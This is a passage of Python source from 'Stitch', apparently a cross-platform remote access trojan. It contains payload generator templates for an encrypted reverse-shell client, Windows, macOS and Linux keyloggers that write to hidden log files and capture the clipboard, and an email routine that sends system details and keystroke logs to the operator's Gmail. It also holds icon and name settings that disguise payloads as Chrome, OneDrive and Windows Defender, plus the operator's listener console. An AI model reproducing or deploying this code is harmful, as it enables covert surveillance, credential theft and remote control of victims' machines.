        {3}({2},{6})
        {3}({2},{6})
        {3}({2},user)
        {3}({2},hostname)
        {3}({2},platform.platform())
        cmd_buffer=""
        while N:
            cmd_buffer = receive({2})
            if not cmd_buffer: break
            if cmd_buffer == "end_connection": break
            determine_cmd(str(cmd_buffer),{2})
        {2}.close()
    except Exception as e:
        if dbg:
            print e
        {2}.close()

dbg = False
nt_kl = keylogger()
script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))\n
'''.format(st_obf[0],st_obf[1],st_obf[2],st_obf[3],st_obf[4],st_obf[5],st_obf[6],
            st_obf[7],st_obf[8],st_obf[9])

# windows st_running = 'C:\\Windows\\Temp:stshell.log'
# posix st_running = '/tmp/.stshell.log'
# st_obf[3] = send
# st_obf[4] = arg_list
# st_obf[5] = errors
# st_obf[6] = sys.platform

def win_reg_exists():
    return '''
def reg_exists(path):
    try:
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,path)
        return True
    except:
        return False\n\n
'''

def win_util_imports():
    return '''
import vidcap
import pyHook
import _winreg
import pythoncom
from ctypes import *
import win32clipboard
from mss.windows import MSS
from st_win_keylogger import *
from PIL import Image, ImageFile
from creddump.hashdump import dump_file_hashes
'''

def osx_util_imports():
    return '''
import pexpect
import pexpect.pxssh
from mss.darwin import MSS
from st_osx_keylogger import *
from PyObjCTools import AppHelper
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from AppKit import NSApplication, NSApp, NSWorkspace\n\n
'''

def lnx_util_imports():
    return '''
import pexpect
import pyxhook
import pexpect.pxssh
from mss.linux import MSS
from st_lnx_keylogger import *\n
'''

################################################################################
#                       st_encryption.py stitch_gen variables                  #
################################################################################

def get_encryption():
    return '''
import base64
from Crypto import Random
from Crypto.Cipher import AES

abbrev = '{2}'
{0} = base64.b64decode('{1}')

def encrypt(raw):
    iv = Random.new().read( AES.block_size )
    cipher = AES.new({0}, AES.MODE_CFB, iv )
    return (base64.b64encode( iv + cipher.encrypt( raw ) ) )

def decrypt(enc):
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new({0}, AES.MODE_CFB, iv )
    return cipher.decrypt( enc[16:] )
'''.format(st_obf[0],aes_encoded,aes_abbrev)

################################################################################
#                       st_protocol.py stitch_gen variables                    #
################################################################################

def get_protocol():
    return '''
import socket
import struct
from st_encryption import *

st_eof = base64.b64decode('c3RpdGNoNjI2aGN0aXRz')
st_complete = base64.b64decode('c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz')

def recvall(sock, count, size=False):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    if size: return buf
    else: return decrypt(buf)

def send(sock, data, encryption=True):
    while data:
        if encryption:
            cmd = encrypt(data[:1024])
        else:
            cmd = data[:1024]
        length = len(cmd)
        sock.sendall(struct.pack('!i', length))
        sock.sendall(cmd)
        data = data[1024:]
    if encryption:
        eof = encrypt(st_eof)
    else:
        eof = st_eof
    eof_len = len(eof)
    sock.sendall(struct.pack('!i', eof_len))
    sock.sendall(eof)

def receive(sock,silent=False,timeout=True):
    full_response=''
    while True:
        lengthbuf = recvall(sock, 4, size=True)
        length, = struct.unpack('!i', lengthbuf)
        response = recvall(sock, length)
        if response != st_eof:
            full_response += response
        else:
            break
    return full_response
'''

################################################################################
#                       st_win_keylogger.py stitch_gen variables               #
################################################################################

def get_win_keylogger():
    return '''
import os
import sys
import time
import ctypes
import pyHook
import datetime
import pythoncom
import threading
import subprocess
from ctypes import *
import win32clipboard

class keylogger():

    def __init__(self):
        self.kl_status = False
        self.frz_status = False
        self.active_window = ''
        self.log_file = 'C:\\Windows\\Temp:stkl.log'

    def start(self):
        kl_summary = ''
        self.kl_status= True
        now = datetime.datetime.now()
        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\\n[ {} ] - Keylogger is now running".format(start_time)
        self.log_handle = open(self.log_file,'a')
        self.log_handle.write(kl_summary)
        self.thread = threading.Thread(target=self.run)
        self.thread.start()

    def start_freeze(self):
        self.frz_status = True
        self.thread = threading.Thread(target=self.run_freeze)
        self.thread.start()

    def win_get_clipboard(self):
        try:
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return pasted_value
        except Exception:
            return

    def get_active_win(self):
        kl_summary = ''
        hwnd = self.user32.GetForegroundWindow()
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = "{}".format(pid.value)
        executable = create_string_buffer("\\x00" * 512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        window_title = create_string_buffer("\\x00" * 512)
        length = self.user32.GetWindowTextA(hwnd, byref(window_title),512)
        now = datetime.datetime.now()
        proc_time=now.strftime("%Y-%m-%d %H:%M:%S")
        proc_info = "[ %s ][ PID: %s - %s - %s ]" % (proc_time, process_id, executable.value, window_title.value)
        kl_summary = "\\n\\n"
        kl_summary += proc_info
        kl_summary += "\\n"
        if self.kl_status:
            self.log_handle.write(kl_summary)

        # close handles
        self.kernel32.CloseHandle(hwnd)
        self.kernel32.CloseHandle(h_process)

    def KeyStroke(self,event):
        kl_summary = ''
        if self.kl_status:
            if event.WindowName != self.active_window:
                self.active_window = event.WindowName
                self.get_active_win()
                self.key_count = 0
            if self.key_count > 75:
                kl_summary += "\\n"
                self.key_count = 0
            if event.Ascii > 32 and event.Ascii < 127:
                kl_summary += chr(event.Ascii)
                self.key_count += 1
            else:
                if event.Key == "V":
                    try:
                        pasted_value = self.win_get_clipboard()
                        kl_summary += "[PASTE] - {}".format(pasted_value)
                        self.key_count += 10+len(pasted_value)
                        self.last_pasted_value = pasted_value
                    except Exception as e:
                        if 'access is denied' in str(e).lower():
                            kl_summary += "[PASTE] - {}".format(self.last_pasted_value)
                            self.key_count += 10+len(last_pasted_value)
                else:
                    kl_summary += "[{}]".format(event.Key)
                    self.key_count += 2+len(event.Key)
            self.log_handle.write(kl_summary)
        return True

    def run(self):
        kl_summary = ''
        self.kl_status= True
        self.key_count = 0
        self.kl = pyHook.HookManager()
        self.psapi = ctypes.windll.psapi
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.pasted_value = self.win_get_clipboard()

        while self.kl_status:
            self.kl.KeyDown = self.KeyStroke
            self.kl.HookKeyboard()
            while self.kl_status:
                pythoncom.PumpWaitingMessages()
            self.kl.__del__()
        now = datetime.datetime.now()
        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\\n\\n[ {} ] - Keylogger has been stopped\\n".format(end_time)
        self.log_handle.write(kl_summary)
        self.log_handle.close()

    def keyFreeze(self,event):
        return False

    def keyUnfreeze(self,event):
        return True

    def run_freeze(self):
        while self.frz_status:
            freezer = pyHook.HookManager()
            freezer.MouseAll = self.keyFreeze
            freezer.KeyAll = self.keyFreeze
            freezer.HookMouse()
            freezer.HookKeyboard()
            while self.frz_status:
                pythoncom.PumpWaitingMessages()
            freezer.MouseAll = self.keyUnfreeze
            freezer.KeyAll = self.keyUnfreeze
            freezer.HookMouse()
            freezer.HookKeyboard()
            freezer.__del__()

    def stop(self):
        self.kl_status = False

    def stop_freeze(self):
        self.frz_status = False

    def get_status(self):
        return self.kl_status

    def get_frz_status(self):
        return self.frz_status

    def dump_logs(self):
        with open(self.log_file,'rb') as s:
            resp = ''
            data = s.readlines()
            for line in data:
                resp += line
        return resp

    def get_dump(self):
        if self.get_status():
            self.kl_status = False
            self.log_handle.close()
            resp=self.dump_logs()
            self.log_handle = open(self.log_file,'w')
            self.kl_status = True
            self.active_window = ''
            self.key_count = 0
        else:
            resp=self.dump_logs()
        return str(resp)

def start_st_kl():
    try:
        st_kl = keylogger()
        st_kl.start()
        return True
    except Exception as e:
        return "ERROR: {}".format(e)
'''


################################################################################
#                       st_osx_keylogger.py stitch_gen variables               #
################################################################################

def get_osx_keylogger():
    return '''
import re
import time
import datetime
import threading
from AppKit import NSApplication, NSApp, NSWorkspace
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper

class keylogger():

    def __init__(self):
        self.log_file = '/tmp/.stkl.log'
        self.kl_status = False
        mask = NSKeyDownMask
        self.st_monitor = NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask,self.KeyStroke)
        self.active_window = ''

    def KeyStroke(self,event):
        if self.kl_status:
            try:
                self.check_active_win()
                self.key_count += 1
                keystroke = re.findall(' chars="(.)" ',str(event))[0]
                self.log_handle.write(keystroke)
                if self.key_count > 75:
                    self.log_handle.write('\\n')
                    self.key_count = 0
                #self.log_handle.write(str(event))
            except Exception as e:
                pass

    def check_active_win(self):
        if NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'] not in self.active_win:
            self.active_window = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
            now = datetime.datetime.now()
            start_time=now.strftime("%Y-%m-%d %H:%M:%S")
            kl_summary = "\\n\\n[ {} ] - {}\\n".format(start_time,self.active_window)
            self.log_handle.write(kl_summary)

    def start(self):
        self.log_handle = open(self.log_file,'a')
        self.kl_status = True
        self.key_count = 0
        now = datetime.datetime.now()
        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\\n[ {} ] - Keylogger is now running".format(start_time)
        self.log_handle.write(kl_summary)

    def stop(self):
        self.kl_status = False
        now = datetime.datetime.now()
        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\\n\\n[ {} ] - Keylogger has been stopped\\n".format(end_time)
        self.log_handle.write(kl_summary)
        self.log_handle.close()

    def get_status(self):
        return self.kl_status

    def dump_logs(self):
        with open(self.log_file,'rb') as s:
            resp = ''
            data = s.readlines()
            for line in data:
                if '\\x7f' in line:
                    line = line.replace('\\x7f','[BS]')
                resp += line
        return resp

    def get_dump(self):
        if self.get_status():
            self.kl_status = False
            self.log_handle.close()
            resp=self.dump_logs()
            self.log_handle = open(self.log_file,'w')
            self.kl_status = True
            self.active_window = ''
            self.key_count = 0
        else:
            resp=self.dump_logs()
        return str(resp)
'''


################################################################################
#                       st_lnx_keylogger.py stitch_gen variables               #
################################################################################

def get_lnx_keylogger():
    return '''
import os
import sys
import time
import pyxhook
import datetime
import threading

class keylogger():

    def __init__(self):
        self.kl_status = False
        self.active_window = ''
        self.active_proc = ''
        self.log_file = '/tmp/.stkl.log'

    def start(self):
        self.log_handle = open(self.log_file,'a')
        self.kl_status = True
        self.key_count = 0
        now = datetime.datetime.now()
        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\\n[ {} ] - Keylogger is now running".format(start_time)
        self.log_handle.write(kl_summary)
        self.thread = threading.Thread(target=self.run)
        self.thread.start()

    def run(self):
        self.kl_hook=pyxhook.HookManager()
        self.kl_hook.KeyDown=self.KeyStroke
        self.kl_hook.HookKeyboard()
        self.kl_hook.start()

    def KeyStroke(self,event):
        if self.kl_status:
            kl_summary = ''
            self.check_active_win(event.WindowName, event.WindowProcName)
            if self.key_count > 75:
                self.log_handle.write("\\n")
                self.key_count = 0
            if len(event.Key) > 1:
                self.log_handle.write('[{}]'.format(event.Key))
                self.key_count += len(event.Key) + 2
            else:
                self.log_handle.write(event.Key)
                self.key_count += 1

    def check_active_win(self, win_name, win_proc):
        if win_name != self.active_window or win_proc != self.active_proc:
            self.active_window = win_name
            self.active_proc = win_proc
            now = datetime.datetime.now()
            start_time=now.strftime("%Y-%m-%d %H:%M:%S")
            kl_summary = "\\n\\n[ {} ] - {}: {}\\n".format(start_time,self.active_window,self.active_proc)
            self.log_handle.write(kl_summary)

    def stop(self):
        self.kl_status = False
        self.kl_hook.cancel()
        now = datetime.datetime.now()
        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\\n\\n[ {} ] - Keylogger has been stopped\\n".format(end_time)
        self.log_handle.write(kl_summary)
        self.log_handle.close()

    def get_status(self):
        return self.kl_status

    def dump_logs(self):
        with open(self.log_file,'rb') as s:
            resp = ''
            data = s.readlines()
            for line in data:
                resp += line
        return resp

    def get_dump(self):
        if self.get_status():
            self.kl_status = False
            self.log_handle.close()
            resp=self.dump_logs()
            self.log_handle = open(self.log_file,'w')
            self.kl_status = True
            self.active_window = ''
            self.active_proc = ''
            self.key_count = 0
        else:
            resp=self.dump_logs()
        return str(resp)
'''


################################################################################
#                        stitch_gen email implementation                       #
################################################################################


def email_imports():
    return '''
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import Encoders
'''

def get_email(user,pwd):
    return '''
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import Encoders

hour = int(strftime("%H"))
am_pm = "AM"
if hour > 12:
    hour = str(hour - 12)
    am_pm = "PM"
try:
    is_admin = os.getuid() == 0
except AttributeError:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    pass

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8",80))
ip =(s.getsockname()[0])
s.close()
if win_client():
    os.chdir(os.path.join(os.getenv('userprofile'),'Desktop'))
    user = os.getenv('username')
    arch = run_command('wmic os get osarchitecture').split('\\n')[1]
else:
    user = run_command("whoami").strip().replace("\\\\","-")
    arch = run_command('uname -m')
    if 'x86_64' in arch:
        arch = '64-bit'
    else:
        arch = '32-bit'
time = "{{}}{{}}{{}}".format(str(hour),strftime(":%M:%S "),am_pm)
date = strftime("%m/%d/%Y")
stinfo = (  "   OS{{8:25}}: {{0}}"
            "\\n   Architecture{{8:13}}: {{1}}"
            "\\n   User{{8:23}}: {{2}}"
            "\\n   Admin Rights{{8:11}}: {{3}}"
            "\\n   Network IP{{8:14}}: {{4}}"
            "\\n   Network Name{{8:9}}: {{5}}\\n"
            "\\n   Date{{8:23}}: {{6}}"
            "\\n   Time{{8:23}}: {{7}}\\n"
).format(platform.platform(),arch,user,str(is_admin),ip,platform.node(),date,time," ")

gmail_user = '{0}'
gmail_pwd = '{1}'

msg =MIMEMultipart()
msg['From'] = '{0}'
msg['To'] = '{0}'
msg['Subject'] = "Hello from {{}}".format(ip)
body = 'This system is now up and running:\\n\\n{{}}'.format(stinfo)

msg.attach(MIMEText(body,'plain'))
filename = "kl.log"
win_kf = 'C:\\Windows\\Temp:stkl.log'
pos_kf = '/tmp/.stkl.log'
if os.path.exists(win_kf):
    attachment = open(win_kf,"rb")
elif os.path.exists(pos_kf):
    attachment = open(pos_kf,"rb")
else:
    attachment = False

if attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= {{}}".format(filename))
    msg.attach(part)

try:
    server = smtplib.SMTP("smtp.gmail.com", 587)

    # identify ourselves, prompting server for supported features
    server.ehlo()

    # If we can encrypt this session, do it
    if server.has_extn('STARTTLS'):
        server.starttls()
        server.ehlo() # re-identify ourselves over TLS connection

    server.login('{0}', '{1}')
    text = msg.as_string()
    server.sendmail(user, '{0}', text)
    server.close()
    with open('suuuup.txt','w') as s:
        s.write('should have finished')
except Exception as e:
    with open('failed.txt', 'w') as s:
        s.write(str(e))
    pass

'''.format(user,pwd)

################################################################################
#                       st_requirments.py stitch_gen variables                 #
################################################################################

def get_requirements():
    return '''
import os
import re
import sys
import math
import time
import socket
import base64
import shutil
import ctypes
import socket
import struct
import zipfile
import datetime
import requests
import StringIO
import platform
import threading
import subprocess
from Crypto import Random
from Crypto.Cipher import AES
from mss import ScreenshotError
from time import strftime, sleep
from contextlib import contextmanager
from base64 import b64decode as INFO
from zlib import decompress as SEC

from st_utils import *
from st_protocol import *
from st_encryption import *
'''

```

`Application/Stitch_Vars/payload_setup.py`:

```py
# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

################################################################################
#                        Windows Payload Variables                             #
################################################################################

win_payload_list = ['chrome','drive','IAStorIcon','SecEdit',
                    'searchfilterhost','WUDFPort','MSASTUIL','WmiPrvSE']

win_payload_Icons = {'chrome':"..\\Icons\\chrome\\chrome.ico",
'drive' : "..\\Icons\\drive\\drive.ico",
'IAStorIcon' : "..\\Icons\\IAStorIcon\\IAStorIcon.ico",
'SecEdit' : "..\\Icons\\SecEdit\\SecEdit.ico",
'searchfilterhost' : "..\\Icons\\searchfilterhost\\searchfilterhost.ico",
'WUDFPort' : "..\\Icons\\WUDFPort\\WUDFPort.ico",
'MSASTUIL' : "..\\Icons\\windef\\windef.ico",
'WmiPrvSE' : "..\\Icons\\WmiPrvSE\\WmiPrvSE.ico"}

win_payload_Description = {'chrome':'stGoogle Chrome',
'drive' : 'stMicrosoft OneDrive',
'IAStorIcon' : 'stIAStorIcon',
'SecEdit' : 'stWindows Security Configuration Command Tool',
'searchfilterhost' : 'stMicrosoft Windows Search Filter Host',
'WUDFPort' : 'stWindows Driver Foundation - User-mode Driver Framework Port Management',
'MSASTUIL' : 'stWindows Defender notification icon',
'WmiPrvSE' : 'stWMI Provider Host'}

win_payload_Name = {'chrome':'stGoogle Chrome',
'drive' : 'stMicrosoft OneDrive',
'IAStorIcon' : 'stIAStorIcon',
'SecEdit' : u"stMicrosoft® Windows® Operating System",
'searchfilterhost' : u"stWindows® Search",
'WUDFPort' : u"stMicrosoft® Windows® Operating System",
'MSASTUIL' : u"stMicrosoft® Windows® Operating System",
'WmiPrvSE' : u"stMicrosoft® Windows® Operating System"}


################################################################################
#                        OSX Payload Variables                                 #
################################################################################

osx_payload_list = ['Appstore','chrome','Launchpad','Safari','System_Preferences']

osx_payload_Icons ={ 'Appstore' : '../Icons/Appstore/AppIcon.icns',
'chrome' : '../Icons/chrome/app.icns',
'Launchpad' : '../Icons/Launchpad/Launchpad.icns',
'Safari' : '../Icons/Safari/compass.icns',
'System_Preferences' : '../Icons/System_Preferences/PrefApp.icns'}

################################################################################
#                        OSX Payload Variables                                 #
################################################################################

lnx_payload_list = ['stitch_lnx', 'smbd_st','cupst','nmbd_st','sshst']

```

`Application/stitch_cmd.py`:

```py
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import stitch_winshell
import stitch_osxshell
import stitch_lnxshell
from stitch_gen import *
from stitch_help import *
from stitch_utils import *

class stitch_server(cmd.Cmd):
    inf_sock = {}
    inf_port = {}
    inf_name = {}

    listen_port = None
    server_thread = None

    def __init__(self):
        cmd.Cmd.__init__(self)
        path_name = get_cwd()
        self.Config = ConfigParser.ConfigParser()
        self.Config.read(hist_ini)
        self.aes_lib = ConfigParser.ConfigParser()
        self.aes_lib.read(st_aes_lib)
        self.prompt = "{} {} ".format(st_tag,path_name)
        display_banner()

    def ConfigSectionMap(self, section):
        dict1 = {}
        options = self.Config.options(section)
        for option in options:
            try:
                dict1[option] = self.Config.get(section, option)
                if dict1[option] == -1:
                    pass
            except:
                print("exception on {}!".format(option))
                dict1[option] = None
        return dict1

    def AESLibMap(self, section):
        dict1 = {}
        options = self.aes_lib.options(section)
        for option in options:
            try:
                dict1[option] = self.aes_lib.get(section, option)
                if dict1[option] == -1:
                    pass
            except:
                print("exception on {}!".format(option))
                dict1[option] = None
        return dict1

    def display_history(self):
        self.Config.read(hist_ini)
        history_title = "=== Connection History ==="
        st_print(history_title)
        for n in self.Config.sections():
            n_target = n
            n_port = self.ConfigSectionMap(n)['port']
            n_user = self.ConfigSectionMap(n)['user']
            n_os = self.ConfigSectionMap(n)['os']
            n_hostname = self.ConfigSectionMap(n)['hostname']
            print_cyan('\n{}'.format(n))
            print_border(len(n),'-')
            print('   User: {}\n   Hostname: {}\n   Listening Port: {}\n'
            '   Operating System: {}\n'.format( n_user, n_hostname, n_port, n_os))
        print ""

    def remove_hsection(self,section):
        if section in self.Config.sections():
            self.cfgfile = open(hist_ini,'wb')
            self.Config.remove_section(section)
            self.Config.write(self.cfgfile)
            self.cfgfile.close()
            st_print('[+] Successfully removed {} from your history.\n'.format(section))
        else:
            st_print('[!] Could not find {} in your history.\n'.format(section))

    def default(self, line):
        st_log.info('Stitch cmd command: "{}"'.format(line))
        st_print(run_command(line))

    def run_server(self):
        client_socket=None
        self.server_running = True
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('',self.l_port))
            server.listen(10)
            self.listen_port = self.l_port
        except Exception as e:
            self.server_thread='Failed'
            return
        self.server_thread = threading.currentThread()
        while True:
            if not self.server_running:
                break
            try:
                server.settimeout(2)
                client_socket, addr = server.accept()
            except Exception as e:
                pass
            if client_socket:
                self.inf_sock[addr[0]] = client_socket
                self.inf_port[addr[0]] = addr[1]
                st_print('[+] New successful connection from {}\n'.format(addr))
                client_socket = None
        server.close()
        for n in self.inf_sock: self.inf_sock[n].close()
        self.inf_sock={}
        self.inf_port={}
        self.listen_port=None
        self.server_thread=None

    def stop_server(self):
        self.server_running=False

    def recvall(self,sock,count,encryption=True):
        buf = b''
        while count:
            newbuf = sock.recv(count)
            if not newbuf: return None
            if not encryption:
                buf += newbuf
            else:
                buf += decrypt(newbuf, self.aes_enc)
            count -= len(newbuf)
        return buf

    def receive(self,sock,encryption=True):
        full_response = ""
        while True:
            lengthbuf = self.recvall(sock, 4, encryption=False)
            length, = struct.unpack('!i', lengthbuf)
            response = self.recvall(sock, length, encryption=encryption)
            if response != st_eof:
                full_response += response
            else:
                break
        return full_response

################################################################################
#                           Start of DO Section                                #
################################################################################

    def do_addkey(self, line):
        if line:
            add_aes(line)
            self.aes_lib.read(st_aes_lib)
        else:
            usage_addkey()

    def do_cat(self,line):
        if line:
            if windows_client():
                cmd ='more {}'.format(line)
            else:
                cmd = 'cat {}'.format(line)
            st_print(run_command(cmd))
        else:
            usage_cat()

    def do_cd(self, line):
        if line != '':
            try:
                os.chdir(line)
                print
            except Exception as e:
                st_print("[*] {}\n".format(e))
        else:
            self.do_pwd(line)
        self.path_name= get_cwd()
        self.prompt = "{} {} ".format(st_tag,self.path_name)

    def do_cls(self, line):
        clear_screen()

    def do_clear(self, line):
        clear_screen()

    def do_dir(self,line):
        self.do_ls(line)

    def do_history(self, line):
        self.display_history()

    def do_history_remove(self, line):
        if line != '':
            self.remove_hsection(line)
        else:
            usage_history_remove()

    def do_home(self, line):
        display_banner()

    def do_ipconfig(self,line):
        if windows_client():
            cmd = 'ipconfig {}'.format(line)
        else:
            cmd = 'ifconfig {}'.format(line)
        st_print(run_command(cmd))

    def do_ifconfig(self,line):
        self.do_ipconfig(line)

    def do_lsmod(self,line):
        if windows_client():
            cmd = 'driverquery {}'.format(line)
        elif linux_client():
            cmd = 'lsmod {}'.format(line)
        else:
            cmd = 'kextstat {}'.format(line)
        st_print(run_command(cmd))

    def do_ls(self,line):
        if windows_client():
            cmd = 'dir /a {}'.format(line)
        else:
            cmd = 'ls -alh {}'.format(line)
        st_print(run_command(cmd))

    def do_listen(self,line):
        if len(line) < 1:
            usage_listen()
            return
        try:
            self.l_port = int(line)
        except ValueError:
            st_print("[!] ERROR: The port argument {} is not an int.\n".format(line[2]))
            st_print('[*] Usage: listen [port]\n')
            return
        while self.server_thread is not None:
            self.stop_server()
            time.sleep(1)
        server = threading.Thread(target=self.run_server, args=())
        server.daemon = True
        server.start()
        while True:
            if self.server_thread is not None:
                if self.server_thread == 'Failed':
                    st_print("[!] Unable to listen on port {}\n".format(self.l_port))
                    self.server_thread = None
                    break
                elif "Thread" in str(self.server_thread) and "started" in str(self.server_thread):
                    st_print("[+] Now listening on port {}\n".format(self.l_port))
                    break

    def do_more(self,line):
        if line:
            self.do_cat(line)
        else:
            usage_more()

    def do_pwd(self,line):
        st_print('{}\n'.format(os.getcwd()))

    def do_ps(self,line):
        if windows_client():
            cmd = 'tasklist {}'.format(line)
        else:
            cmd = 'ps {}'.format(line)
        st_print(run_command(cmd))

    def do_start(self, line):
        if windows_client():
            cmd = 'start {}'.format(line)
        elif osx_client() and not line:
            cmd = 'open -a Terminal .'
        else:
            cmd = './{} &'.format(line)
        st_print(start_command(cmd))

    def do_sessions(self,line):
        i = 0
        session_title = '=== Connected to port {} ==='.format(self.listen_port)
        st_print(session_title)
        for n in self.inf_sock:
            if n in self.Config.sections():
                n_target = n
                n_user = self.ConfigSectionMap(n)['user']
                n_os = self.ConfigSectionMap(n)['os']
                n_hostname = self.ConfigSectionMap(n)['hostname']
            else:
                n_target = n
                n_user = '----'
                n_os = '----------------'
                n_hostname = '--------'
            print_cyan ('\n{}'.format(n),)
            print_border(len(n),'-')
            print ('   User: {}\n   Hostname: {}\n'
            '   Operating System: {}\n'.format(n_user, n_hostname, n_os))
            i += 1
        print

    def do_shell (self,line):
        if len(line.split()) != 1:
            usage_shell()
        else:
            self.target = line
            if str(self.target) in self.inf_sock:
                self.conn = self.inf_sock[self.target]
                self.port = self.inf_port[self.target]
                del self.inf_sock[self.target]
                del self.inf_port[self.target]
                try:
                    st_confirm = self.receive(self.conn,encryption=False)
                    if st_confirm == base64.b64encode('stitch_shell'):
                        conn_aes = self.receive(self.conn,encryption=False)
                        if conn_aes in self.aes_lib.sections():
                            self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                            self.aes_enc = base64.b64decode(self.aes_enc)
                            st_log.info('Starting shell on {}:{}'.format(self.target, self.port))
                            st_print('[+] Connection successful from {}:{}'.format(self.target, self.port))
                            target_os = self.receive(self.conn)
                            if no_error(target_os):
                                if windows_client(target_os):
                                    st_print('[*] Starting Windows Shell...\n')
                                    stitch_winshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                elif linux_client(target_os):
                                    st_print('[*] Starting Linux Shell...\n')
                                    stitch_lnxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                elif osx_client(target_os):
                                    st_print('[*] Starting Mac OS X Shell...\n')
                                    stitch_osxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                else:
                                    st.log.error('Unsupported OS: {}'.format(target_os))
                                    st_print('[!] Unsupported OS: {}\n'.format(target_os))
                            else:
                                st_print(target_os)
                        else:
                            st_print('[!] The target connection is using an encryption key not found in the AES library.')
                            st_print('[*] Use the "addkey" command to add encryption keys to the AES library.\n')
                            self.conn.close()
                    else:
                        st_print('[!] Non-stitch application trying to connect.\n')
                        self.conn.close()
                except KeyboardInterrupt:
                    st_print("[-] Disconnected from {}\n".format(self.target))
                    st_log.info('KeyboardInterrupt caused disconnect from {}'.format(self.target))
                    self.conn.close()
                except Exception as e:
                    st_print("[!] Exception!")
                    st_print("[*] {}".format(str(e)))
                    st_log.error('Exception:\n{}'.format(str(e)))
                    st_print("[-] Disconnected from {}\n".format(self.target))
                    self.conn.close()
            else:
                st_print("[!] There are no active connections to {}\n".format(self.target))

    def do_showkey(self,line):
        show_aes()

    def do_stitchgen(self,line):
        cur_dir = os.getcwd()
        os.chdir(configuration_path)
        try:
            run_exe_gen()
        finally:
            os.chdir(cur_dir)

    def do_connect(self,line):
        line = line.split()
        if len(line) < 1 or len(line) > 2:
            usage_connect()
        else:
            self.target = line[0]
            if len(line) == 1:
                self.port = 80
            else:
                try:
                    self.port = int(line[1])
                except ValueError:
                    st_print("[!] ERROR: The port argument {} is not an int.\n".format(line[1]))
                    return
            st_print('[*] Connecting to {} on port {}...'.format(self.target, self.port))
            st_log.info('Trying to connect to {}:{}'.format(self.target, self.port))
            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.settimeout(8)
                self.client.connect((self.target, self.port))
                st_confirm = self.receive(self.client,encryption=False)
                if st_confirm == base64.b64encode('stitch_shell'):
                    conn_aes = self.receive(self.client,encryption=False)
                    if conn_aes in self.aes_lib.sections():
                        self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                        self.aes_enc = base64.b64decode(self.aes_enc)
                        st_print('[+] Connection successful.')
                        target_os = self.receive(self.client)
                        if no_error(target_os):
                            if windows_client(target_os):
                                st_print('[*] Starting Windows Shell...\n')
                                stitch_winshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            elif linux_client(target_os):
                                st_print('[*] Starting Linux Shell...\n')
                                stitch_lnxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            elif osx_client(target_os):
                                st_print('[*] Starting OSX Shell...\n')
                                stitch_osxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            else:
                                st.log.error('Unsupported OS: {}'.format(target_os))
                                st_print('[!] Unsupported OS: {}\n'.format(target_os))
                        else:
                            st_print(target_os)
                    else:
                        st_print('[!] The target connection is using an encryption key not found in the AES library.')
                        st_print('[*] Use the "addkey" command to add encryption keys to the AES library.\n')
                        self.client.close()
                else:
                    st_print('[!] Non-stitch application trying to connect.\n')
                    self.client.close()
            except KeyboardInterrupt:
                st_print("[-] Disconnected from {}\n".format(self.target))
                st_log.info('KeyboardInterrupt caused disconnect from {}'.format(self.target))
                self.client.close()
            except Exception as e:
                st_print("[!] Exception!")
                st_print("[*] {}".format(e))
                st_log.error('Exception:\n{}'.format(str(e)))
                st_print("[-] Disconnected from {}\n".format(self.target))
                self.client.close()

    def do_touch(self,line):
        if windows_client():
            cmd = 'if not exist {} type NUL > {}'.format(line,line)
        else:
            cmd = 'touch {}'.format(line)
        st_print(run_command(cmd))

    def emptyline(self):
        pass

    def do_exit(self, line=None):
        for n in self.inf_sock: self.inf_sock[n].close()
        st_print("[-] Exiting Stitch...\n")
        return True

    def do_EOF(self, line):
        print
        return self.do_exit(line)

################################################################################
#                        Start of COMPLETE Section                             #
